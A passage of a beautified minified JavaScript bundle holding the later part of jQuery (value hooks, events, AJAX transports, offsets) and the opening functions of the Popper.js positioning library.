  var St = /\r/g;
  S.fn.extend({
    val: function (n) {
      var i,
        e,
        o,
        t = this[0];
      return arguments.length ? (o = b(n), this.each(function (e) {
        var t;
        1 === this.nodeType && (null == (t = o ? n.call(this, e, S(this).val()) : n) ? t = "" : "number" == typeof t ? t += "" : Array.isArray(t) && (t = S.map(t, function (e) {
          return null == e ? "" : e + "";
        })), (i = S.valHooks[this.type] || S.valHooks[this.nodeName.toLowerCase()]) && "set" in i && void 0 !== i.set(this, t, "value") || (this.value = t));
      })) : t ? (i = S.valHooks[t.type] || S.valHooks[t.nodeName.toLowerCase()]) && "get" in i && void 0 !== (e = i.get(t, "value")) ? e : "string" == typeof (e = t.value) ? e.replace(St, "") : null == e ? "" : e : void 0;
    }
  }), S.extend({
    valHooks: {
      option: {
        get: function (e) {
          var t = S.find.attr(e, "value");
          return null != t ? t : jt(S.text(e));
        }
      },
      select: {
        get: function (e) {
          var t,
            n,
            i,
            o = e.options,
            r = e.selectedIndex,
            a = "select-one" === e.type,
            s = a ? null : [],
            l = a ? r + 1 : o.length;
          for (i = r < 0 ? l : a ? r : 0; i < l; i++) if (((n = o[i]).selected || i === r) && !n.disabled && (!n.parentNode.disabled || !T(n.parentNode, "optgroup"))) {
            if (t = S(n).val(), a) return t;
            s.push(t);
          }
          return s;
        },
        set: function (e, t) {
          for (var n, i, o = e.options, r = S.makeArray(t), a = o.length; a--;) ((i = o[a]).selected = -1 < S.inArray(S.valHooks.option.get(i), r)) && (n = !0);
          return n || (e.selectedIndex = -1), r;
        }
      }
    }
  }), S.each(["radio", "checkbox"], function () {
    S.valHooks[this] = {
      set: function (e, t) {
        if (Array.isArray(t)) return e.checked = -1 < S.inArray(S(e).val(), t);
      }
    }, y.checkOn || (S.valHooks[this].get = function (e) {
      return null === e.getAttribute("value") ? "on" : e.value;
    });
  }), y.focusin = "onfocusin" in C;
  function $t(e) {
    e.stopPropagation();
  }
  var Tt = /^(?:focusinfocus|focusoutblur)$/;
  S.extend(S.event, {
    trigger: function (e, t, n, i) {
      var o,
        r,
        a,
        s,
        l,
        d,
        c,
        u,
        p = [n || k],
        h = v.call(e, "type") ? e.type : e,
        f = v.call(e, "namespace") ? e.namespace.split(".") : [];
      if (r = u = a = n = n || k, 3 !== n.nodeType && 8 !== n.nodeType && !Tt.test(h + S.event.triggered) && (-1 < h.indexOf(".") && (h = (f = h.split(".")).shift(), f.sort()), l = h.indexOf(":") < 0 && "on" + h, (e = e[S.expando] ? e : new S.Event(h, "object" == typeof e && e)).isTrigger = i ? 2 : 3, e.namespace = f.join("."), e.rnamespace = e.namespace ? new RegExp("(^|\\.)" + f.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = n), t = null == t ? [e] : S.makeArray(t, [e]), c = S.event.special[h] || {}, i || !c.trigger || !1 !== c.trigger.apply(n, t))) {
        if (!i && !c.noBubble && !g(n)) {
          for (s = c.delegateType || h, Tt.test(s + h) || (r = r.parentNode); r; r = r.parentNode) p.push(r), a = r;
          a === (n.ownerDocument || k) && p.push(a.defaultView || a.parentWindow || C);
        }
        for (o = 0; (r = p[o++]) && !e.isPropagationStopped();) u = r, e.type = 1 < o ? s : c.bindType || h, (d = (K.get(r, "events") || {})[e.type] && K.get(r, "handle")) && d.apply(r, t), (d = l && r[l]) && d.apply && X(r) && (e.result = d.apply(r, t), !1 === e.result && e.preventDefault());
        return e.type = h, i || e.isDefaultPrevented() || c._default && !1 !== c._default.apply(p.pop(), t) || !X(n) || l && b(n[h]) && !g(n) && ((a = n[l]) && (n[l] = null), S.event.triggered = h, e.isPropagationStopped() && u.addEventListener(h, $t), n[h](), e.isPropagationStopped() && u.removeEventListener(h, $t), S.event.triggered = void 0, a && (n[l] = a)), e.result;
      }
    },
    simulate: function (e, t, n) {
      var i = S.extend(new S.Event(), n, {
        type: e,
        isSimulated: !0
      });
      S.event.trigger(i, null, t);
    }
  }), S.fn.extend({
    trigger: function (e, t) {
      return this.each(function () {
        S.event.trigger(e, t, this);
      });
    },
    triggerHandler: function (e, t) {
      var n = this[0];
      if (n) return S.event.trigger(e, t, n, !0);
    }
  }), y.focusin || S.each({
    focus: "focusin",
    blur: "focusout"
  }, function (n, i) {
    function o(e) {
      S.event.simulate(i, e.target, S.event.fix(e));
    }
    S.event.special[i] = {
      setup: function () {
        var e = this.ownerDocument || this,
          t = K.access(e, i);
        t || e.addEventListener(n, o, !0), K.access(e, i, (t || 0) + 1);
      },
      teardown: function () {
        var e = this.ownerDocument || this,
          t = K.access(e, i) - 1;
        t ? K.access(e, i, t) : (e.removeEventListener(n, o, !0), K.remove(e, i));
      }
    };
  });
  var Et = C.location,
    Dt = Date.now(),
    _t = /\?/;
  S.parseXML = function (e) {
    var t;
    if (!e || "string" != typeof e) return null;
    try {
      t = new C.DOMParser().parseFromString(e, "text/xml");
    } catch (e) {
      t = void 0;
    }
    return t && !t.getElementsByTagName("parsererror").length || S.error("Invalid XML: " + e), t;
  };
  var At = /\[\]$/,
    It = /\r?\n/g,
    Pt = /^(?:submit|button|image|reset|file)$/i,
    Ht = /^(?:input|select|textarea|keygen)/i;
  function Mt(n, e, i, o) {
    var t;
    if (Array.isArray(e)) S.each(e, function (e, t) {
      i || At.test(n) ? o(n, t) : Mt(n + "[" + ("object" == typeof t && null != t ? e : "") + "]", t, i, o);
    });else if (i || "object" !== x(e)) o(n, e);else for (t in e) Mt(n + "[" + t + "]", e[t], i, o);
  }
  S.param = function (e, t) {
    function n(e, t) {
      var n = b(t) ? t() : t;
      o[o.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n);
    }
    var i,
      o = [];
    if (Array.isArray(e) || e.jquery && !S.isPlainObject(e)) S.each(e, function () {
      n(this.name, this.value);
    });else for (i in e) Mt(i, e[i], t, n);
    return o.join("&");
  }, S.fn.extend({
    serialize: function () {
      return S.param(this.serializeArray());
    },
    serializeArray: function () {
      return this.map(function () {
        var e = S.prop(this, "elements");
        return e ? S.makeArray(e) : this;
      }).filter(function () {
        var e = this.type;
        return this.name && !S(this).is(":disabled") && Ht.test(this.nodeName) && !Pt.test(e) && (this.checked || !le.test(e));
      }).map(function (e, t) {
        var n = S(this).val();
        return null == n ? null : Array.isArray(n) ? S.map(n, function (e) {
          return {
            name: t.name,
            value: e.replace(It, "\r\n")
          };
        }) : {
          name: t.name,
          value: n.replace(It, "\r\n")
        };
      }).get();
    }
  });
  var Lt = /%20/g,
    Nt = /#.*$/,
    Ot = /([?&])_=[^&]*/,
    Rt = /^(.*?):[ \t]*([^\r\n]*)$/gm,
    Ft = /^(?:GET|HEAD)$/,
    Bt = /^\/\//,
    zt = {},
    qt = {},
    Wt = "*/".concat("*"),
    Ut = k.createElement("a");
  function Yt(r) {
    return function (e, t) {
      "string" != typeof e && (t = e, e = "*");
      var n,
        i = 0,
        o = e.toLowerCase().match(M) || [];
      if (b(t)) for (; n = o[i++];) "+" === n[0] ? (n = n.slice(1) || "*", (r[n] = r[n] || []).unshift(t)) : (r[n] = r[n] || []).push(t);
    };
  }
  function Xt(t, o, r, a) {
    var s = {},
      l = t === qt;
    function d(e) {
      var i;
      return s[e] = !0, S.each(t[e] || [], function (e, t) {
        var n = t(o, r, a);
        return "string" != typeof n || l || s[n] ? l ? !(i = n) : void 0 : (o.dataTypes.unshift(n), d(n), !1);
      }), i;
    }
    return d(o.dataTypes[0]) || !s["*"] && d("*");
  }
  function Vt(e, t) {
    var n,
      i,
      o = S.ajaxSettings.flatOptions || {};
    for (n in t) void 0 !== t[n] && ((o[n] ? e : i = i || {})[n] = t[n]);
    return i && S.extend(!0, e, i), e;
  }
  Ut.href = Et.href, S.extend({
    active: 0,
    lastModified: {},
    etag: {},
    ajaxSettings: {
      url: Et.href,
      type: "GET",
      isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Et.protocol),
      global: !0,
      processData: !0,
      async: !0,
      contentType: "application/x-www-form-urlencoded; charset=UTF-8",
      accepts: {
        "*": Wt,
        text: "text/plain",
        html: "text/html",
        xml: "application/xml, text/xml",
        json: "application/json, text/javascript"
      },
      contents: {
        xml: /\bxml\b/,
        html: /\bhtml/,
        json: /\bjson\b/
      },
      responseFields: {
        xml: "responseXML",
        text: "responseText",
        json: "responseJSON"
      },
      converters: {
        "* text": String,
        "text html": !0,
        "text json": JSON.parse,
        "text xml": S.parseXML
      },
      flatOptions: {
        url: !0,
        context: !0
      }
    },
    ajaxSetup: function (e, t) {
      return t ? Vt(Vt(e, S.ajaxSettings), t) : Vt(S.ajaxSettings, e);
    },
    ajaxPrefilter: Yt(zt),
    ajaxTransport: Yt(qt),
    ajax: function (e, t) {
      "object" == typeof e && (t = e, e = void 0), t = t || {};
      var c,
        u,
        p,
        n,
        h,
        i,
        f,
        g,
        o,
        r,
        m = S.ajaxSetup({}, t),
        v = m.context || m,
        y = m.context && (v.nodeType || v.jquery) ? S(v) : S.event,
        b = S.Deferred(),
        w = S.Callbacks("once memory"),
        x = m.statusCode || {},
        a = {},
        s = {},
        l = "canceled",
        j = {
          readyState: 0,
          getResponseHeader: function (e) {
            var t;
            if (f) {
              if (!n) for (n = {}; t = Rt.exec(p);) n[t[1].toLowerCase()] = t[2];
              t = n[e.toLowerCase()];
            }
            return null == t ? null : t;
          },
          getAllResponseHeaders: function () {
            return f ? p : null;
          },
          setRequestHeader: function (e, t) {
            return null == f && (e = s[e.toLowerCase()] = s[e.toLowerCase()] || e, a[e] = t), this;
          },
          overrideMimeType: function (e) {
            return null == f && (m.mimeType = e), this;
          },
          statusCode: function (e) {
            var t;
            if (e) if (f) j.always(e[j.status]);else for (t in e) x[t] = [x[t], e[t]];
            return this;
          },
          abort: function (e) {
            var t = e || l;
            return c && c.abort(t), d(0, t), this;
          }
        };
      if (b.promise(j), m.url = ((e || m.url || Et.href) + "").replace(Bt, Et.protocol + "//"), m.type = t.method || t.type || m.method || m.type, m.dataTypes = (m.dataType || "*").toLowerCase().match(M) || [""], null == m.crossDomain) {
        i = k.createElement("a");
        try {
          i.href = m.url, i.href = i.href, m.crossDomain = Ut.protocol + "//" + Ut.host != i.protocol + "//" + i.host;
        } catch (e) {
          m.crossDomain = !0;
        }
      }
      if (m.data && m.processData && "string" != typeof m.data && (m.data = S.param(m.data, m.traditional)), Xt(zt, m, t, j), f) return j;
      for (o in (g = S.event && m.global) && 0 == S.active++ && S.event.trigger("ajaxStart"), m.type = m.type.toUpperCase(), m.hasContent = !Ft.test(m.type), u = m.url.replace(Nt, ""), m.hasContent ? m.data && m.processData && 0 === (m.contentType || "").indexOf("application/x-www-form-urlencoded") && (m.data = m.data.replace(Lt, "+")) : (r = m.url.slice(u.length), m.data && (m.processData || "string" == typeof m.data) && (u += (_t.test(u) ? "&" : "?") + m.data, delete m.data), !1 === m.cache && (u = u.replace(Ot, "$1"), r = (_t.test(u) ? "&" : "?") + "_=" + Dt++ + r), m.url = u + r), m.ifModified && (S.lastModified[u] && j.setRequestHeader("If-Modified-Since", S.lastModified[u]), S.etag[u] && j.setRequestHeader("If-None-Match", S.etag[u])), (m.data && m.hasContent && !1 !== m.contentType || t.contentType) && j.setRequestHeader("Content-Type", m.contentType), j.setRequestHeader("Accept", m.dataTypes[0] && m.accepts[m.dataTypes[0]] ? m.accepts[m.dataTypes[0]] + ("*" !== m.dataTypes[0] ? ", " + Wt + "; q=0.01" : "") : m.accepts["*"]), m.headers) j.setRequestHeader(o, m.headers[o]);
      if (m.beforeSend && (!1 === m.beforeSend.call(v, j, m) || f)) return j.abort();
      if (l = "abort", w.add(m.complete), j.done(m.success), j.fail(m.error), c = Xt(qt, m, t, j)) {
        if (j.readyState = 1, g && y.trigger("ajaxSend", [j, m]), f) return j;
        m.async && 0 < m.timeout && (h = C.setTimeout(function () {
          j.abort("timeout");
        }, m.timeout));
        try {
          f = !1, c.send(a, d);
        } catch (e) {
          if (f) throw e;
          d(-1, e);
        }
      } else d(-1, "No Transport");
      function d(e, t, n, i) {
        var o,
          r,
          a,
          s,
          l,
          d = t;
        f || (f = !0, h && C.clearTimeout(h), c = void 0, p = i || "", j.readyState = 0 < e ? 4 : 0, o = 200 <= e && e < 300 || 304 === e, n && (s = function (e, t, n) {
          for (var i, o, r, a, s = e.contents, l = e.dataTypes; "*" === l[0];) l.shift(), void 0 === i && (i = e.mimeType || t.getResponseHeader("Content-Type"));
          if (i) for (o in s) if (s[o] && s[o].test(i)) {
            l.unshift(o);
            break;
          }
          if (l[0] in n) r = l[0];else {
            for (o in n) {
              if (!l[0] || e.converters[o + " " + l[0]]) {
                r = o;
                break;
              }
              a = a || o;
            }
            r = r || a;
          }
          if (r) return r !== l[0] && l.unshift(r), n[r];
        }(m, j, n)), s = function (e, t, n, i) {
          var o,
            r,
            a,
            s,
            l,
            d = {},
            c = e.dataTypes.slice();
          if (c[1]) for (a in e.converters) d[a.toLowerCase()] = e.converters[a];
          for (r = c.shift(); r;) if (e.responseFields[r] && (n[e.responseFields[r]] = t), !l && i && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = r, r = c.shift()) if ("*" === r) r = l;else if ("*" !== l && l !== r) {
            if (!(a = d[l + " " + r] || d["* " + r])) for (o in d) if ((s = o.split(" "))[1] === r && (a = d[l + " " + s[0]] || d["* " + s[0]])) {
              !0 === a ? a = d[o] : !0 !== d[o] && (r = s[0], c.unshift(s[1]));
              break;
            }
            if (!0 !== a) if (a && e.throws) t = a(t);else try {
              t = a(t);
            } catch (e) {
              return {
                state: "parsererror",
                error: a ? e : "No conversion from " + l + " to " + r
              };
            }
          }
          return {
            state: "success",
            data: t
          };
        }(m, s, j, o), o ? (m.ifModified && ((l = j.getResponseHeader("Last-Modified")) && (S.lastModified[u] = l), (l = j.getResponseHeader("etag")) && (S.etag[u] = l)), 204 === e || "HEAD" === m.type ? d = "nocontent" : 304 === e ? d = "notmodified" : (d = s.state, r = s.data, o = !(a = s.error))) : (a = d, !e && d || (d = "error", e < 0 && (e = 0))), j.status = e, j.statusText = (t || d) + "", o ? b.resolveWith(v, [r, d, j]) : b.rejectWith(v, [j, d, a]), j.statusCode(x), x = void 0, g && y.trigger(o ? "ajaxSuccess" : "ajaxError", [j, m, o ? r : a]), w.fireWith(v, [j, d]), g && (y.trigger("ajaxComplete", [j, m]), --S.active || S.event.trigger("ajaxStop")));
      }
      return j;
    },
    getJSON: function (e, t, n) {
      return S.get(e, t, n, "json");
    },
    getScript: function (e, t) {
      return S.get(e, void 0, t, "script");
    }
  }), S.each(["get", "post"], function (e, o) {
    S[o] = function (e, t, n, i) {
      return b(t) && (i = i || n, n = t, t = void 0), S.ajax(S.extend({
        url: e,
        type: o,
        dataType: i,
        data: t,
        success: n
      }, S.isPlainObject(e) && e));
    };
  }), S._evalUrl = function (e) {
    return S.ajax({
      url: e,
      type: "GET",
      dataType: "script",
      cache: !0,
      async: !1,
      global: !1,
      throws: !0
    });
  }, S.fn.extend({
    wrapAll: function (e) {
      var t;
      return this[0] && (b(e) && (e = e.call(this[0])), t = S(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map(function () {
        for (var e = this; e.firstElementChild;) e = e.firstElementChild;
        return e;
      }).append(this)), this;
    },
    wrapInner: function (n) {
      return b(n) ? this.each(function (e) {
        S(this).wrapInner(n.call(this, e));
      }) : this.each(function () {
        var e = S(this),
          t = e.contents();
        t.length ? t.wrapAll(n) : e.append(n);
      });
    },
    wrap: function (t) {
      var n = b(t);
      return this.each(function (e) {
        S(this).wrapAll(n ? t.call(this, e) : t);
      });
    },
    unwrap: function (e) {
      return this.parent(e).not("body").each(function () {
        S(this).replaceWith(this.childNodes);
      }), this;
    }
  }), S.expr.pseudos.hidden = function (e) {
    return !S.expr.pseudos.visible(e);
  }, S.expr.pseudos.visible = function (e) {
    return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length);
  }, S.ajaxSettings.xhr = function () {
    try {
      return new C.XMLHttpRequest();
    } catch (e) {}
  };
  var Kt = {
      0: 200,
      1223: 204
    },
    Qt = S.ajaxSettings.xhr();
  y.cors = !!Qt && "withCredentials" in Qt, y.ajax = Qt = !!Qt, S.ajaxTransport(function (o) {
    var r, a;
    if (y.cors || Qt && !o.crossDomain) return {
      send: function (e, t) {
        var n,
          i = o.xhr();
        if (i.open(o.type, o.url, o.async, o.username, o.password), o.xhrFields) for (n in o.xhrFields) i[n] = o.xhrFields[n];
        for (n in o.mimeType && i.overrideMimeType && i.overrideMimeType(o.mimeType), o.crossDomain || e["X-Requested-With"] || (e["X-Requested-With"] = "XMLHttpRequest"), e) i.setRequestHeader(n, e[n]);
        r = function (e) {
          return function () {
            r && (r = a = i.onload = i.onerror = i.onabort = i.ontimeout = i.onreadystatechange = null, "abort" === e ? i.abort() : "error" === e ? "number" != typeof i.status ? t(0, "error") : t(i.status, i.statusText) : t(Kt[i.status] || i.status, i.statusText, "text" !== (i.responseType || "text") || "string" != typeof i.responseText ? {
              binary: i.response
            } : {
              text: i.responseText
            }, i.getAllResponseHeaders()));
          };
        }, i.onload = r(), a = i.onerror = i.ontimeout = r("error"), void 0 !== i.onabort ? i.onabort = a : i.onreadystatechange = function () {
          4 === i.readyState && C.setTimeout(function () {
            r && a();
          });
        }, r = r("abort");
        try {
          i.send(o.hasContent && o.data || null);
        } catch (e) {
          if (r) throw e;
        }
      },
      abort: function () {
        r && r();
      }
    };
  }), S.ajaxPrefilter(function (e) {
    e.crossDomain && (e.contents.script = !1);
  }), S.ajaxSetup({
    accepts: {
      script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
    },
    contents: {
      script: /\b(?:java|ecma)script\b/
    },
    converters: {
      "text script": function (e) {
        return S.globalEval(e), e;
      }
    }
  }), S.ajaxPrefilter("script", function (e) {
    void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET");
  }), S.ajaxTransport("script", function (n) {
    var i, o;
    if (n.crossDomain) return {
      send: function (e, t) {
        i = S("<script>").prop({
          charset: n.scriptCharset,
          src: n.url
        }).on("load error", o = function (e) {
          i.remove(), o = null, e && t("error" === e.type ? 404 : 200, e.type);
        }), k.head.appendChild(i[0]);
      },
      abort: function () {
        o && o();
      }
    };
  });
  var Gt,
    Jt = [],
    Zt = /(=)\?(?=&|$)|\?\?/;
  S.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function () {
      var e = Jt.pop() || S.expando + "_" + Dt++;
      return this[e] = !0, e;
    }
  }), S.ajaxPrefilter("json jsonp", function (e, t, n) {
    var i,
      o,
      r,
      a = !1 !== e.jsonp && (Zt.test(e.url) ? "url" : "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && Zt.test(e.data) && "data");
    if (a || "jsonp" === e.dataTypes[0]) return i = e.jsonpCallback = b(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, a ? e[a] = e[a].replace(Zt, "$1" + i) : !1 !== e.jsonp && (e.url += (_t.test(e.url) ? "&" : "?") + e.jsonp + "=" + i), e.converters["script json"] = function () {
      return r || S.error(i + " was not called"), r[0];
    }, e.dataTypes[0] = "json", o = C[i], C[i] = function () {
      r = arguments;
    }, n.always(function () {
      void 0 === o ? S(C).removeProp(i) : C[i] = o, e[i] && (e.jsonpCallback = t.jsonpCallback, Jt.push(i)), r && b(o) && o(r[0]), r = o = void 0;
    }), "script";
  }), y.createHTMLDocument = ((Gt = k.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === Gt.childNodes.length), S.parseHTML = function (e, t, n) {
    return "string" != typeof e ? [] : ("boolean" == typeof t && (n = t, t = !1), t || (y.createHTMLDocument ? ((i = (t = k.implementation.createHTMLDocument("")).createElement("base")).href = k.location.href, t.head.appendChild(i)) : t = k), r = !n && [], (o = E.exec(e)) ? [t.createElement(o[1])] : (o = ve([e], t, r), r && r.length && S(r).remove(), S.merge([], o.childNodes)));
    var i, o, r;
  }, S.fn.load = function (e, t, n) {
    var i,
      o,
      r,
      a = this,
      s = e.indexOf(" ");
    return -1 < s && (i = jt(e.slice(s)), e = e.slice(0, s)), b(t) ? (n = t, t = void 0) : t && "object" == typeof t && (o = "POST"), 0 < a.length && S.ajax({
      url: e,
      type: o || "GET",
      dataType: "html",
      data: t
    }).done(function (e) {
      r = arguments, a.html(i ? S("<div>").append(S.parseHTML(e)).find(i) : e);
    }).always(n && function (e, t) {
      a.each(function () {
        n.apply(this, r || [e.responseText, t, e]);
      });
    }), this;
  }, S.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (e, t) {
    S.fn[t] = function (e) {
      return this.on(t, e);
    };
  }), S.expr.pseudos.animated = function (t) {
    return S.grep(S.timers, function (e) {
      return t === e.elem;
    }).length;
  }, S.offset = {
    setOffset: function (e, t, n) {
      var i,
        o,
        r,
        a,
        s,
        l,
        d = S.css(e, "position"),
        c = S(e),
        u = {};
      "static" === d && (e.style.position = "relative"), s = c.offset(), r = S.css(e, "top"), l = S.css(e, "left"), o = ("absolute" === d || "fixed" === d) && -1 < (r + l).indexOf("auto") ? (a = (i = c.position()).top, i.left) : (a = parseFloat(r) || 0, parseFloat(l) || 0), b(t) && (t = t.call(e, n, S.extend({}, s))), null != t.top && (u.top = t.top - s.top + a), null != t.left && (u.left = t.left - s.left + o), "using" in t ? t.using.call(e, u) : c.css(u);
    }
  }, S.fn.extend({
    offset: function (t) {
      if (arguments.length) return void 0 === t ? this : this.each(function (e) {
        S.offset.setOffset(this, t, e);
      });
      var e,
        n,
        i = this[0];
      return i ? i.getClientRects().length ? (e = i.getBoundingClientRect(), n = i.ownerDocument.defaultView, {
        top: e.top + n.pageYOffset,
        left: e.left + n.pageXOffset
      }) : {
        top: 0,
        left: 0
      } : void 0;
    },
    position: function () {
      if (this[0]) {
        var e,
          t,
          n,
          i = this[0],
          o = {
            top: 0,
            left: 0
          };
        if ("fixed" === S.css(i, "position")) t = i.getBoundingClientRect();else {
          for (t = this.offset(), n = i.ownerDocument, e = i.offsetParent || n.documentElement; e && (e === n.body || e === n.documentElement) && "static" === S.css(e, "position");) e = e.parentNode;
          e && e !== i && 1 === e.nodeType && ((o = S(e).offset()).top += S.css(e, "borderTopWidth", !0), o.left += S.css(e, "borderLeftWidth", !0));
        }
        return {
          top: t.top - o.top - S.css(i, "marginTop", !0),
          left: t.left - o.left - S.css(i, "marginLeft", !0)
        };
      }
    },
    offsetParent: function () {
      return this.map(function () {
        for (var e = this.offsetParent; e && "static" === S.css(e, "position");) e = e.offsetParent;
        return e || ye;
      });
    }
  }), S.each({
    scrollLeft: "pageXOffset",
    scrollTop: "pageYOffset"
  }, function (t, o) {
    var r = "pageYOffset" === o;
    S.fn[t] = function (e) {
      return z(this, function (e, t, n) {
        var i;
        if (g(e) ? i = e : 9 === e.nodeType && (i = e.defaultView), void 0 === n) return i ? i[o] : e[t];
        i ? i.scrollTo(r ? i.pageXOffset : n, r ? n : i.pageYOffset) : e[t] = n;
      }, t, e, arguments.length);
    };
  }), S.each(["top", "left"], function (e, n) {
    S.cssHooks[n] = Ke(y.pixelPosition, function (e, t) {
      if (t) return t = Ve(e, n), qe.test(t) ? S(e).position()[n] + "px" : t;
    });
  }), S.each({
    Height: "height",
    Width: "width"
  }, function (a, s) {
    S.each({
      padding: "inner" + a,
      content: s,
      "": "outer" + a
    }, function (i, r) {
      S.fn[r] = function (e, t) {
        var n = arguments.length && (i || "boolean" != typeof e),
          o = i || (!0 === e || !0 === t ? "margin" : "border");
        return z(this, function (e, t, n) {
          var i;
          return g(e) ? 0 === r.indexOf("outer") ? e["inner" + a] : e.document.documentElement["client" + a] : 9 === e.nodeType ? (i = e.documentElement, Math.max(e.body["scroll" + a], i["scroll" + a], e.body["offset" + a], i["offset" + a], i["client" + a])) : void 0 === n ? S.css(e, t, o) : S.style(e, t, n, o);
        }, s, n ? e : void 0, n);
      };
    });
  }), S.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function (e, n) {
    S.fn[n] = function (e, t) {
      return 0 < arguments.length ? this.on(n, null, e, t) : this.trigger(n);
    };
  }), S.fn.extend({
    hover: function (e, t) {
      return this.mouseenter(e).mouseleave(t || e);
    }
  }), S.fn.extend({
    bind: function (e, t, n) {
      return this.on(e, null, t, n);
    },
    unbind: function (e, t) {
      return this.off(e, null, t);
    },
    delegate: function (e, t, n, i) {
      return this.on(t, e, n, i);
    },
    undelegate: function (e, t, n) {
      return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n);
    }
  }), S.proxy = function (e, t) {
    var n, i, o;
    if ("string" == typeof t && (n = e[t], t = e, e = n), b(e)) return i = s.call(arguments, 2), (o = function () {
      return e.apply(t || this, i.concat(s.call(arguments)));
    }).guid = e.guid = e.guid || S.guid++, o;
  }, S.holdReady = function (e) {
    e ? S.readyWait++ : S.ready(!0);
  }, S.isArray = Array.isArray, S.parseJSON = JSON.parse, S.nodeName = T, S.isFunction = b, S.isWindow = g, S.camelCase = Y, S.type = x, S.now = Date.now, S.isNumeric = function (e) {
    var t = S.type(e);
    return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e));
  }, "function" == typeof define && define.amd && define("jquery", [], function () {
    return S;
  });
  var en = C.jQuery,
    tn = C.$;
  return S.noConflict = function (e) {
    return C.$ === S && (C.$ = tn), e && C.jQuery === S && (C.jQuery = en), S;
  }, e || (C.jQuery = C.$ = S), S;
}), function (e, t) {
  "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : e.Popper = t();
}(this, function () {
  "use strict";

  function r(e) {
    return e && "[object Function]" === {}.toString.call(e);
  }
  function w(e, t) {
    if (1 !== e.nodeType) return [];
    var n = getComputedStyle(e, null);
    return t ? n[t] : n;
  }
  function h(e) {
    return "HTML" === e.nodeName ? e : e.parentNode || e.host;
  }
  function g(e) {
    if (!e) return document.body;
    switch (e.nodeName) {
      case "HTML":
      case "BODY":
        return e.ownerDocument.body;
      case "#document":
        return e.body;
    }
    var t = w(e),
      n = t.overflow,
      i = t.overflowX,
      o = t.overflowY;
    return /(auto|scroll|overlay)/.test(n + o + i) ? e : g(h(e));
  }
  function m(e) {
    return 11 === e ? W : 10 === e ? U : W || U;
  }
  function y(e) {
    if (!e) return document.documentElement;
    for (var t = m(10) ? document.body : null, n = e.offsetParent; n === t && e.nextElementSibling;) n = (e = e.nextElementSibling).offsetParent;
    var i = n && n.nodeName;
    return i && "BODY" !== i && "HTML" !== i ? -1 !== ["TD", "TABLE"].indexOf(n.nodeName) && "static" === w(n, "position") ? y(n) : n : e ? e.ownerDocument.documentElement : document.documentElement;
  }
  function c(e) {
    return null === e.parentNode ? e : c(e.parentNode);
  }
  function f(e, t) {
    if (!(e && e.nodeType && t && t.nodeType)) return document.documentElement;
    var n = e.compareDocumentPosition(t) & Node.DOCUMENT_POSITION_FOLLOWING,
      i = n ? e : t,
      o = n ? t : e,
      r = document.createRange();
    r.setStart(i, 0), r.setEnd(o, 0);
    var a,
      s,
      l = r.commonAncestorContainer;
    if (e !== l && t !== l || i.contains(o)) return "BODY" === (s = (a = l).nodeName) || "HTML" !== s && y(a.firstElementChild) !== a ? y(l) : l;
    var d = c(e);
    return d.host ? f(d.host, t) : f(e, c(t).host);
  }
  function v(e, t) {
    var n = "top" === (1 < arguments.length && void 0 !== t ? t : "top") ? "scrollTop" : "scrollLeft",
      i = e.nodeName;
    if ("BODY" !== i && "HTML" !== i) return e[n];
    var o = e.ownerDocument.documentElement;
    return (e.ownerDocument.scrollingElement || o)[n];
  }
  function u(e, t) {
    var n = "x" === t ? "Left" : "Top",
      i = "Left" == n ? "Right" : "Bottom";
    return parseFloat(e["border" + n + "Width"], 10) + parseFloat(e["border" + i + "Width"], 10);
  }
  function i(e, t, n, i) {
    return N(t["offset" + e], t["scroll" + e], n["client" + e], n["offset" + e], n["scroll" + e], m(10) ? n["offset" + e] + i["margin" + ("Height" === e ? "Top" : "Left")] + i["margin" + ("Height" === e ? "Bottom" : "Right")] : 0);
  }
  function b() {
    var e = document.body,
      t = document.documentElement,
      n = m(10) && getComputedStyle(t);
    return {
      height: i("Height", e, t, n),
      width: i("Width", e, t, n)
    };
  }
  function x(e) {
    return X({}, e, {
      right: e.left + e.width,
      bottom: e.top + e.height
    });
  }
  function j(e) {
    var t = {};
    try {
      if (m(10)) {
        t = e.getBoundingClientRect();
        var n = v(e, "top"),
          i = v(e, "left");
        t.top += n, t.left += i, t.bottom += n, t.right += i;
      } else t = e.getBoundingClientRect();
    } catch (e) {}
    var o = {
        left: t.left,
        top: t.top,
        width: t.right - t.left,
        height: t.bottom - t.top
      },
      r = "HTML" === e.nodeName ? b() : {},
      a = r.width || e.clientWidth || o.right - o.left,
      s = r.height || e.clientHeight || o.bottom - o.top,
      l = e.offsetWidth - a,
      d = e.offsetHeight - s;
    if (l || d) {
      var c = w(e);
      l -= u(c, "x"), d -= u(c, "y"), o.width -= l, o.height -= d;
    }
    return x(o);
  }
  function C(e, t, n) {
    var i = 2 < arguments.length && void 0 !== n && n,
      o = m(10),
      r = "HTML" === t.nodeName,
      a = j(e),
      s = j(t),
      l = g(e),
      d = w(t),
      c = parseFloat(d.borderTopWidth, 10),
      u = parseFloat(d.borderLeftWidth, 10);
    i && "HTML" === t.nodeName && (s.top = N(s.top, 0), s.left = N(s.left, 0));
    var p = x({
      top: a.top - s.top - c,
      left: a.left - s.left - u,
      width: a.width,
      height: a.height
    });
    if (p.marginTop = 0, p.marginLeft = 0, !o && r) {
      var h = parseFloat(d.marginTop, 10),
        f = parseFloat(d.marginLeft, 10);
